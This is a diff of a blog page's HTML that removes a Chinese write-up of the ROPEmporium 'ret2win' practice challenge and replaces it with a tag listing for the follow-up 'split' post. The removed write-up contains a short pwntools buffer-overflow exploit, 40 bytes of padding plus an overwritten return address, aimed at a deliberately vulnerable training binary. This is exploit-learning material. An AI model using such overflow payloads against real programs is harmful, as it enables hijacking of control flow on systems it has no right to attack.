@@ -5,6 +5,8 @@
   <!-- SEO相关 -->
   
     
+      <meta name="robots" content="noindex,follow">
+    
   
   <!-- 渲染优化 -->
   <meta name="renderer" content="webkit">
@@ -16,12 +18,8 @@
 
   <!-- 页面元数据 -->
   
-    <title>ROPEmporium ret2win - 192&#39;s blog</title>
+    <title>标签：split - 192&#39;s blog</title>
   
-    <meta name="keywords" content="ROPEmporium,ret2win">
-  
-  
-    <meta name="description" content="ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04.">
   
 
   <!-- feed -->
@@ -402,12 +400,25 @@
     <div class='body-wrapper'>
       
 
+
 <div class='l_main'>
   
-
-  
-    <article id="post" class="post white-box shadow article-type-post" itemscope itemprop="blogPost">
+    
       
+  <section class="post-list ">
+    
+      
+        
+          
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
 
 
   <section class='meta'>
@@ -417,13 +428,11 @@
       <div class="meta" id="header-meta">
         
           
-  
-    <h1 class="title">
-      <a href="/2020/04/13/ret2win/">
-        ROPEmporium ret2win
-      </a>
-    </h1>
-  
+  <h2 class="title">
+    <a href="/2020/04/16/split/">
+      ROPEmporium split
+    </a>
+  </h2>
 
 
         
@@ -459,9 +468,14 @@
               <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2020年4月13日</p>
+    <p>发布于：2020年4月16日</p>
   </a>
 </div>
+
+            
+          
+            
+              
 
             
           
@@ -479,214 +493,179 @@
   </section>
 
 
-      <section class="article typo">
-        <div class="article-entry" itemprop="articleBody">
-          
-          <h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p>
-<a id="more"></a>
-
-
-
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote>
-<p><a href="https://ropemporium.com/challenge/ret2win.html" target="_blank" rel="noopener">https://ropemporium.com/challenge/ret2win.html</a></p>
-</blockquote>
-<p>checksec</p>
-<p><img src="https://i.loli.net/2020/04/13/uW1I7QOGf5B3aq9.png" alt="image-20200413103432122"></p>
-<p>r2</p>
-<p><img src="https://i.loli.net/2020/04/13/Aiw4HRZID8yGfpK.png" alt="image-20200413103753525"></p>
-<p>发现是fgets</p>
-<p><img src="https://i.loli.net/2020/04/13/jOLK3wlnsfJcbTI.png" alt="image-20200413103911513"></p>
-<p>可以看出来要ret到这个函数里面</p>
-<p>gdb</p>
-<p><img src="https://i.loli.net/2020/04/13/VKAMJZ8t3bWFLsx.png" alt="image-20200413104216804"></p>
-<p><img src="https://i.loli.net/2020/04/13/Utjrz4REmhTYqla.png" alt="image-20200413104400096"></p>
-<p>padding应该有40位。</p>
-<p>构造相应的payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2win'</span>)</span><br><span class="line">info(<span class="string">'%#x target'</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># ret2win = p64(elf.symbols.ret2win)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(<span class="number">0x400824</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag=io.recvall()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/04/13/GEvNs2xaceT8nQl.png" alt="image-20200413104630237"></p>
-<h3 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h3><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p>
-<p>原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充</p>
-<blockquote>
-<p><a href="https://ropemporium.com/guide.html#Common%20pitfalls" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls</a></p>
-</blockquote>
-<p><strong>问题原理：</strong><a href="http://homura.cc/blog/archives/168" target="_blank" rel="noopener">http://homura.cc/blog/archives/168</a></p>
-
-          
-            <br>
-            
-              
-
-            
-          
-        </div>
-        
-          
-
-
-  <section class='meta' id="footer-meta">
-    <div class='new-meta-box'>
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
       
-        
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-16T20:10:42+08:00">
-  <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2020年4月16日</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ROPEmporium/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ROPEmporium</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ret2win/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ret2win</p></a></div>
-
-
-        
-      
-        
-          
-
-        
-      
-        
-          
-  <div class="new-meta-item share -mob-share-list">
-  <div class="-mob-share-list share-body">
-    
-      
-        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
-          
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://ftosims.github.io/2020/04/13/ret2win/&title=ROPEmporium ret2win - 192's blog&summary=ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04."
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
-          
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ftosims.github.io/2020/04/13/ret2win/&title=ROPEmporium ret2win - 192's blog&summary=ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04."
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
-          
-          href="http://service.weibo.com/share/share.php?url=http://ftosims.github.io/2020/04/13/ret2win/&title=ROPEmporium ret2win - 192's blog&summary=ret2win整个过程遇到了许多的坑，系统是ubuntu 18.04."
-          
-          >
-          
-            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
-          
-        </a>
-      
-    
-  </div>
-</div>
-
-
-
-        
+        <h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>上一次的坑这一次碰到了，<a href="/2020/04/13/ret2win/" title="ROPEmporium ret2win">ROPEmporium ret2win</a>里面说当时函数无法成功运行，搜索的结果是十六进制对齐的问题。在那个问题里因为限定了读取的长度为50，而要进行对其至少要40 + 8*3 已经超过了。在这次遇到了这个问题</p>
       
     </div>
+    
+      
+        <div class="button readmore">
+          <a href="/2020/04/16/split/">
+            Read More <i class="fas fa-chevron-right"></i>
+          </a>
+        </div>
+      
+    
   </section>
+</article>
 
-
-        
-        
-          <div class="prev-next">
-            
-              <a class='prev' href='/2020/04/13/Top/'>
-                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>这里是一个置顶帖w</p>
-                <p class='content'>基本上是用来做一个todolist的，emmm就这样啦
-
-
-
-
-TO-DO
-            Ubuntu 18.04下pwn相关细节
-            
-
-
- 问题已解决 
-   ...</p>
-              </a>
-            
-            
-              <a class='next' href='/2020/04/09/Pwnable%202/'>
-                <p class='title'>Pwnalbe.kr C2.collision WP<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-                <p class='content'>Pwnalbe.kr C2.collision WP
-
-
-
-12345678910111213141516171819202122232425262728293031#include &lt;s...</p>
-              </a>
-            
           </div>
         
-      </section>
-    </article>
+      
+    
+  </section>
   
-
-  
-    <!-- 显示推荐文章和评论 -->
-
-
-
-  
-
+    
+    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
+    
+    
 
   
 
 
-
-
-<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
-
-
-
-  <script>
-    window.subData = {
-      title: 'ROPEmporium ret2win',
-      tools: true
-    }
-  </script>
-
-
+    
+  
 </div>
 <aside class='l_side'>
   
   
+    
+    
+
+<section class="widget blogger shadow desktop mobile">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box' href='/about/'>
+          <img no-lazy src='https://i.loli.net/2020/04/09/l3LmByArXOQoFwz.jpg'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+        
+        
+<!-- none-select-br -->
+
+<p></p>
+
+<!-- hitokoto -->
+<div id="hitokoto">少女祈祷中...<div>
+<i id="hitofrom">N0w Load1ng<i>
+
+<script src="https://cdn.jsdelivr.net/npm/bluebird@3/js/browser/bluebird.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/whatwg-fetch@2.0.3/fetch.min.js"></script>
+<script>
+  fetch('https://v1.hitokoto.cn/?c=b')
+    .then(function (res){
+      return res.json();
+    })
+    .then(function (data) {
+      var hitokoto = document.getElementById('hitokoto');
+      hitokoto.innerText = '' + data.hitokoto;
+      var hitofrom = document.getElementById('hitofrom');
+      hitofrom.innerText = "——" + data.from + '\xa0'; 
+    })
+    .catch(function (err) {
+      console.error(err);
+    })
+</script>
+<!-- hikokoto end -->
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="mailto:ftosims@outlook.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://github.com/ftosims"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+          
+            <a href="https://music.163.com/#/user/home?id=108896750"
+              class="social fas fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+  
 
   
     
     
+  
 
-
-  <section class="widget toc-wrapper shadow desktop mobile">
+  <section class="widget category shadow desktop">
     
   <header>
     
-      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
     
   </header>
 
 
     <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2win"><span class="toc-text">ret2win</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个坑"><span class="toc-text">一个坑</span></a></li></ol></li></ol>
+      <ul class="entry navigation">
+        
+          <li><a class="flat-box"
+            title="/categories/PWN/" href="/categories/PWN/"
+            id="categoriesPWN"
+            ><div class='name'>PWN</div><div class='badge'>(5)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/config/" href="/categories/config/"
+            id="categoriesconfig"
+            ><div class='name'>config</div><div class='badge'>(1)</div></a></li>
+        
+      </ul>
     </div>
   </section>
 
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget tagcloud shadow desktop mobile">
+    
+  <header>
+    
+      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <a href="/tags/Pwntools/" style="font-size: 14px; color: #999">Pwntools</a> <a href="/tags/ROPEmporium/" style="font-size: 24px; color: #555">ROPEmporium</a> <a href="/tags/curses/" style="font-size: 14px; color: #999">_curses</a> <a href="/tags/fd/" style="font-size: 24px; color: #555">fd</a> <a href="/tags/pwnable-kr/" style="font-size: 24px; color: #555">pwnable.kr</a> <a href="/tags/pyenv/" style="font-size: 14px; color: #999">pyenv</a> <a href="/tags/ret2win/" style="font-size: 14px; color: #999">ret2win</a> <a href="/tags/split/" style="font-size: 14px; color: #999">split</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
+    </div>
+  </section>
+
+
+  
 
   
 
